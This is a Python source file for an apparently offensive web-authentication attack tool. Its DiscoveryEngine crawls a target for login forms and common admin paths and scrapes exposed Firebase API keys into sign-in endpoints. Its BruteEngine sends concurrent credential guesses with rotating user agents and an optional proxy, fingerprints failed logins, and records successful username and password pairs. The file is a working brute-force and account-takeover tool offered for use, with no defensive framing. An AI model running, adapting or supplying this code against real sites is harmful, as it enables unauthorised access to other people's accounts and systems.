"""
WebAuth Core Engine - Advanced Discovery & Brute Force Logic (RAPTOR-Enhanced).
"""

import asyncio
import aiohttp
import urllib.parse
import re
import random
import logging
import hashlib
import time
from typing import List, Dict, Optional, Set, Any, Tuple
from difflib import SequenceMatcher
from .models import AuthEndpoint, AuthBaseline

logger = logging.getLogger(__name__)

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
]

def get_random_ua():
    return random.choice(USER_AGENTS)

class DiscoveryEngine:
    """Enterprise-grade Discovery Engine with Aggressive Endpoint Identification."""
    
    COMMON_PATHS = [
        '/login', '/admin', '/api/login', '/api/v1/auth', '/auth', 
        '/wp-login.php', '/signin', '/user/login', '/api/auth/token'
    ]

    def __init__(self, session: aiohttp.ClientSession, target: str, max_pages: int = 30, proxy: str = None):
        self.session = session
        self.target = target.rstrip("/")
        self.max_pages = max_pages
        self.proxy = proxy
        self.visited: Set[str] = set()
        self.endpoints: List[AuthEndpoint] = []
        self.queue = asyncio.Queue()

    async def run(self) -> List[AuthEndpoint]:
        """Runs the aggressive discovery cycle."""
        await self.queue.put(self.target)
        
        parsed = urllib.parse.urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        for path in self.COMMON_PATHS:
            await self.queue.put(f"{base_url}{path}")

        workers = [asyncio.create_task(self._worker()) for _ in range(5)]
        try:
            await asyncio.wait_for(self.queue.join(), timeout=300)
        except asyncio.TimeoutError:
            pass
        finally:
            for w in workers: w.cancel()
            
        return self.endpoints

    async def _worker(self):
        while True:
            url = await self.queue.get()
            try:
                url = url.split("#")[0].rstrip("/")
                if url in self.visited or len(self.visited) >= self.max_pages or not url.startswith("http"):
                    continue
                
                self.visited.add(url)
                headers = {'User-Agent': get_random_ua()}
                
                async with self.session.get(url, headers=headers, proxy=self.proxy, timeout=10) as resp:
                    if resp.status == 404: continue
                    
                    body = await resp.text(errors='ignore')
                    content_type = resp.headers.get("Content-Type", "").lower()

                    if HAS_BS4 and "text/html" in content_type:
                        await self._extract_forms(body, url)
                        await self._extract_links(body, url)
                    
                    if "application/javascript" in content_type or url.endswith(".js") or "text/html" in content_type:
                        if 'apiKey' in body:
                            self._extract_firebase(body, url)

            except Exception: pass
            finally: self.queue.task_done()

    async def _extract_forms(self, html, source):
        soup = BeautifulSoup(html, 'html.parser')
        forms = soup.find_all('form')
        
        if not forms:
            wrappers = soup.find_all(['div', 'section', 'main'])
            for wrap in wrappers:
                if wrap.find('input', {'type': 'password'}):
                    forms.append(wrap)

        for form in forms:
            action = urllib.parse.urljoin(source, form.get('action') or source)
            method = (form.get('method') or 'POST').upper()
            
            u_field, p_field = None, None
            inputs = {}
            
            for inp in form.find_all(['input', 'textarea', 'select']):
                name = inp.get('name') or inp.get('id')
                if not name: continue
                
                itype = (inp.get('type') or 'text').lower()
                nl = name.lower()
                
                if itype == "password" or 'pass' in nl or 'pwd' in nl:
                    p_field = name
                elif any(x in nl for x in ['user', 'email', 'login', 'id']):
                    u_field = name
                
                inputs[name] = inp.get('value') or ''

            if u_field and p_field:
                auth_type = 'universal_json' if form.name != 'form' else 'form_urlencoded'
                extra = {k: v for k, v in inputs.items() if k not in [u_field, p_field]}
                self._add_ep(action, auth_type, method, u_field, p_field, extra, source)

    def _is_internal(self, url: str) -> bool:
        """Determines if a URL belongs to the target domain."""
        try:
            return urllib.parse.urlparse(url).netloc == urllib.parse.urlparse(self.target).netloc
        except Exception: return False

    async def _extract_links(self, html, source):
        soup = BeautifulSoup(html, 'html.parser')
        # FIX: Find tags with EITHER href OR src
        for tag in soup.find_all(['a', 'script', 'link']):
            val = tag.get('href') or tag.get('src')
            if not val: continue
            
            n = urllib.parse.urljoin(source, val)
            if self._is_internal(n):
                await self.queue.put(n)

    def _extract_firebase(self, body, source):
        api_key_m = re.search(r'apiKey\s*:\s*["\']([^"\']+)["\']', body)
        if api_key_m:
            firebase_url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={api_key_m.group(1)}"
            self._add_ep(firebase_url, 'universal_json', 'POST', 'email', 'password', {"returnSecureToken": True}, source)

    def _add_ep(self, url, auth_type, method, u, p, extra, source):
        ep = AuthEndpoint(url, auth_type, method, u, p, extra, source)
        if not any(e.url == ep.url for e in self.endpoints):
            self.endpoints.append(ep)


class BruteEngine:
    """RAPTOR-grade Differential Authentication Engine."""
    
    def __init__(self, session: aiohttp.ClientSession, concurrency: int = 10, proxy: str = None):
        self.session = session
        self.sem = asyncio.Semaphore(concurrency)
        self.proxy = proxy
        self.baselines: Dict[str, AuthBaseline] = {}
        self.results: List[Tuple[str, str, str]] = []
        self.rate_limited = False

    async def capture_baseline(self, ep: AuthEndpoint):
        """Captures a robust failure fingerprint."""
        try:
            fake_u = f"fakeuser_{int(time.time())}@example.com"
            fake_p = "ThisPasswordIsFakeAndWillFail123!"
            
            resp_data = await self._send_request(ep, fake_u, fake_p)
            if resp_data:
                status, body, headers = resp_data
                self.baselines[ep.url] = AuthBaseline(
                    failed_status=status,
                    failed_length=len(body),
                    failed_body_sample=body.lower()[:2000]
                )
                return True
        except Exception: pass
        return False

    async def _send_request(self, ep: AuthEndpoint, u: str, p: str) -> Optional[Tuple[int, str, dict]]:
        """Handles the low-level request logic for different auth types."""
        try:
            payload = {ep.username_field: u, ep.password_field: p, **ep.extra_fields}
            headers = {'User-Agent': get_random_ua()}
            
            if ep.auth_type == 'universal_json':
                # Firebase and many APIs require JSON content-type
                async with self.session.post(ep.url, json=payload, headers=headers, proxy=self.proxy, allow_redirects=False, timeout=15) as resp:
                    body = await resp.text(errors='ignore')
                    return resp.status, body, dict(resp.headers)
            else:
                async with self.session.post(ep.url, data=payload, headers=headers, proxy=self.proxy, allow_redirects=False, timeout=15) as resp:
                    body = await resp.text(errors='ignore')
                    return resp.status, body, dict(resp.headers)
        except Exception:
            return None

    async def test(self, ep: AuthEndpoint, u: str, p: str):
        """Executes the advanced Success Detection cycle."""
        if self.rate_limited: return
        
        async with self.sem:
            resp_data = await self._send_request(ep, u, p)
            if not resp_data: return
            
            status, body, headers = resp_data
            body_l = body.lower()
            baseline = self.baselines.get(ep.url)
            
            if status in [429, 403] or 'too many requests' in body_l or 'cloudflare' in body_l:
                self.rate_limited = True
                return

            is_success = False
            
            if status in [200, 201] and baseline and status != baseline.failed_status:
                is_success = True
            
            elif status in [301, 302, 303]:
                loc = headers.get('Location', '').lower()
                if loc and not any(x in loc for x in ['login', 'error', 'fail']):
                    is_success = True
                    
            elif any(k in body_l for k in ['access_token', 'id_token', 'sessionid', 'bearer']):
                if not any(err in body_l for err in ['invalid', 'error', 'failed']):
                    is_success = True

            elif baseline:
                if abs(len(body) - baseline.failed_length) > (baseline.failed_length * 0.1):
                    if not any(x in body_l for x in ["invalid", "incorrect", "fail", "wrong"]):
                        if SequenceMatcher(None, body_l[:2000], baseline.failed_body_sample).ratio() < 0.7:
                            is_success = True

            if is_success:
                self.results.append((ep.url, u, p))
